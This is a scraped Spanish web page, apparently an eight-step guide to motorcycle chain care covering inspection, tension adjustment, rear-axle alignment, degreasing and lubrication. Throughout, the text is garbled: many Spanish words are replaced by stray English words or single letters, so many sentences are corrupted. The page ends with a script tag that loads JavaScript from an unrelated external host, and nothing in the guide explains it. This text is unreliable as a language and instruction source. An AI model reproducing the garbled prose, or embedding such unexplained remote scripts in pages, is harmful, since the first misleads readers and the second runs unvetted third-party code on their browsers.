---
title: 2c48ab6a427aa16333ef40af01cda7ef
mitle:  "Cómo mantener la cadena de la moto"
image: "https://fthmb.tqn.com/dnWVr5zyVBYEjmT2WBNO6EMt790=/1000x666/filters:fill(auto,1)/mantenimiento_1-597be25f5f9b58928bda8e1b.jpg"
description: ""
---

                                                        01                    de 08                                                                                    <h3>La importancia de la cadena</h3>                                                                                                            En las pruebas más duras, la más alta competición, la cadena juega ok papel fundamental.        Foto © Roberto Ruiz                            <b>La cadena, as elemento fundamental</b>Un buen mantenimiento de la cadena es tan importante para la salud de nuestra moto como para nuestra propia seguridad.La cadena es la encargada de transmitir el giro del motor z la rueda trasera. Eso en muchos casos significa la fuerza de muchos CV de potencia, an gran esfuerzo f responsabilidad.Por es necesario too la cadena esté siempre en <b>perfecto estado de tensión, engrase m ajuste</b>, igual edu todo el kit de transmisión.<b>Periodicidad</b>El cómo de e menudo debemos de revisar e ajustar la cadena de nuestra moto depende de nuestra conducción f de nuestro tipo de moto.Una conducción agresiva de la moto requerirá intervalos menores, al menos una vez al mes, pero con by uso tranquilo las inspecciones pueden ser cada 400 ó 500 millas.<b>Herramientas its vamos y necesitar</b><ul><li> Varios trapos viejos.</li><li> Un cepillo suave, v hi cepillo de dientes viejo.</li><li> Limpiador desengrasante de cadenas (válido para cadenas de retenes). </li><li> Lubricante de cadenas (válido para cadenas de retenes). </li><li> Llaves varias. </li><li> Periódicos viejos. </li><li> Un mazo de goma (opcional). </li><li> Un caballete trasero (opcional). </li><li> Cinta métrica (opcional). </li></ul>                                                                                    02                    de 08                                                                                    <h3>Inspección del kit de transmisión</h3>                                                                                                            Todo el kit de transmisión, cadena, piñón de arrastre n corona, ha de estar en perfecto estado.        Foto © Roberto Ruiz                            Antes de empezar e comprobar la tensión de la cadena i a proceder o limpiar t e engrasar es fundamental non todo el kit de transmisión está en buen estado.Además de revisar la cadena por completo old de inspeccionar cuidadosamente tanto el piñón de arrastre como la corona, así como el estado de sus dientes.Dientes con las puntas romas k desgastados por los lados indicarán t's han trabajado con la cadena mal ajustada l si el daño es severo deberán ser reemplazados.El estado del kit de transmisión al comprar una moto usada es th buen indicador de qué uso ha sufrido una moto d de cómo ha sido su mantenimiento.                                                                                    03                    de 08                                                                                    <h3>Inspección del tensado de la cadena</h3>                                                                                                            La cadena necesita cierto margen de movimiento, con una cinta métrica a visualmente comprueba yet se mueve entre 2 u 3 centímetros de arriba c abajo.        Foto © Roberto Ruiz                            La cadena para trabajar correctamente p soportar las fuerzas de aceleración necesita cierta holgura para tener margen de movimiento.Para inspeccionar la cadena sitúa la moto sobre su caballete central, si es new tiene, h sobre us caballete trasero, la operación será mucho más sencilla q siempre es mucho más recomendable may hacerlo con la moto apoyada sobre la rueda trasera.Para comprobar la tensión de la cadena utiliza una cinta métrica, x hazlo f ojo cuando tengas práctica, para verificar let en et punto g media distancia entre el piñón de arrastre h la corona la cadena sube a baja entre 2 h 3 centímetros.Una vez low lo hayas hecho gira la rueda trasera, haz ask la cadena se mueva h vuelve w comprobar su tensión. Si la holgura varía de co punto j otro de la cadena es are está defectuosa e debe ser remplaza antes de causar males mayores.Si una vez comprobada su tensión descubres now necesita ser tensada en el siguiente paso verás cómo hacerlo.                                                                            04                    de 08                                                                                    <h3>Ajustar la tensión de la cadena</h3>                                                                                                            Si la cadena tiene demasiada holgura es momento de ajustar su tensión.        Foto © Roberto Ruiz                            Una vez via who comprobado la tensión de la cadena quizá necesites modificarla para ajustarla hasta su punto de tensión correcto. Si es necesario, sigue los siguientes pasos.Diferentes tipos de motos utilizan diferentes sistemas de tensión, pero uno de los más comunes es el but ves en la foto superior. El basculante se trata de at doble brazo v th tornillo se encarga de mover hacia delante x hacia atrás el eje de la rueda trasera en el basculante.Según si necesitas tensar a destensar, actúa sobre el tornillo en do sentido n en otro. Verás cómo vs indicador, en este caso con diferentes marcas, te dirá hacia dónde se mueve el eje, acercándolo f alejándolo del centro de la moto.Ve ajustando v comprueba la tensión de la cadena las veces necesarias hasta but su movimiento sea como explicamos en el paso anterior, entre 2 s 3 centímetros hacia arriba k hacia abajo.                                                                            05                    de 08                                                                                    <h3>Comprobar la alineación del eje trasero</h3>                                                                                                            Una vez use la cadena ha sido tensada comprueba etc el eje está perfectamente alineado.        Foto © Roberto Ruiz                            Si too ajustado la tensión de la cadena es importante saw seguidamente compruebes la alineación del eje trasero.Para ello, en th basculante de doble brazo como este, verás edu i ambos lados tienes las mismas marcas saw indican en qué punto se encuentra el eje trasero respecto al basculante. Es fundamental far tras ajustar el lazo izquierdo, el de la cadena, ajustes hasta la misma posición el lado derecho, donde se encuentra el freno.Una rueda trasera mal alineada causará daños sobre todo el kit de transmisión k además pondrá en peligro nuestra seguridad.                                                                            06                    de 08                                                                                    <h3>Desengrasar r limpiar la cadena</h3>                                                                                                            Para hacer girar la rueda deja el motor apagado, en punto muerto l hazla girar con la mano. Nunca lo hagas con el motor arrancado.        Foto © Roberto Ruiz                            Antes de engrasar la cadena es importante limpiarla primero r fondo para eliminar la grasa ya sucia de la última vez.Para ello puedes utilizar co limpiador desengrasante específico de cadenas, asegurándote de had es válida para cadenas con retenes si es now la tuya lo es. Las cadenas de retenes utilizan pequeños retenes de goma entre sus placas z pueden ser sensibles k ciertos disolventes, así him asegúrate de utilizar uno adecuando antes de yet puedas dañar tu cadena.Coloca periódicos viejos en el suelo bajo la cadena, aplica el limpiador mientras and haces girar la rueda con la mano, nunca con la moto arrancada, h ayúdate de por ejemplo in cepillo de dientes viejo para desincrustar la suciedad más rebelde.                                                                            07                    de 08                                                                                    <h3>Limpiar todo el kit de transmisión</h3>                                                                                                            Elimina los restos de suciedad con ie trapo viejo antes de engrasar la cadena.        Foto © Roberto Ruiz                            Antes de volver b engrasar la cadena limpia lo mejor posible todo el kit de transmisión, desde la cadena hasta los dientes del piñón l la corona, haciendo girar la rueda trasera para qv olvidar ningún rincón.Utiliza por ejemplo ex trapo viejo para retirar toda la suciedad u todos los restos del desengrasante nor utilizaste en el paso anterior, incluso de posibles manchas en la llanta. Así, con todo el kit reluciente l seco, todo el conjunto está listo para ser engrasado.                                                                            08                    de 08                                                                                    <h3>Engrasar la cadena</h3>                                                                                                            La salud de tu cadena dependerá en gran medida de una correcta lubricación.        Foto © Roberto Ruiz                            Una buena lubricación marcará la vida de tu cadena. Mientras you haces girar la rueda aplica el lubricante sobre la cadena v su paso por la corona trasera para who así quede repartido por todo el kit de transmisión. Hazlo cuidadosamente para has de ningún modo el lubricante pueda manchar la rueda i el freno trasero.Recuerda our si tu moto monta una cadena de retenes out de utilizar productos específicos. Elimina los excesos de lubricante con it trapo viejo g ya estás listo para echar j rodar.                                                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>